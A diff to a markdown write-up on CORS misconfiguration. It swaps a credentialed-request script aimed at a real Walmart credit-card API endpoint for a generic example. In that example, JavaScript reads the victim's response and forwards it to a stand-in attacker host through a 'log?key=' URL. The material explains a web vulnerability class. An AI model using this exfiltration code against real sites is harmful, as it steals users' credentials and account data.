@@ -12,27 +12,32 @@ Detailed: Blindly reflect the Origin header value in `Access-Control-Allow-Orig
 Make requests from any domain you control.
 
 ### Example 
-```javascript
-<script>
-    // Send a cross origin request to the walmart.com server, when a victim visits the page.
-    var req = new XMLHttpRequest();
-    req.open('GET',"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card",true);
-    req.onload = stealData;
-    req.withCredentials = true;
-    req.send();
+**Vulnerable Implementation** 
+```http
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: https://evil.com
+Cookie: sessionid=... 
 
-    function stealData(){
-        //reading response is allowed because of the CORS misconfiguration.
-        var data= JSON.stringify(JSON.parse(this.responseText),null,2);
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://hacker.com
+Access-Control-Allow-Credentials: true 
 
-        //display the data on the page. A real attacker can send the data to his server.
-        output(data);
-    }
-
-    function output(inp) {
-        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
-    }
-</script>
+{"[private API key]"}
 ```
 
-[code source](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#vulnerable-example-null-origin)
+**Exploit**  
+This exploit requires that the respective JS script is hosted at `hacker.com`
+```javascript
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://victim.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText; 
+};
+```
+
+[code source](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#vulnerable-example-origin-reflection)
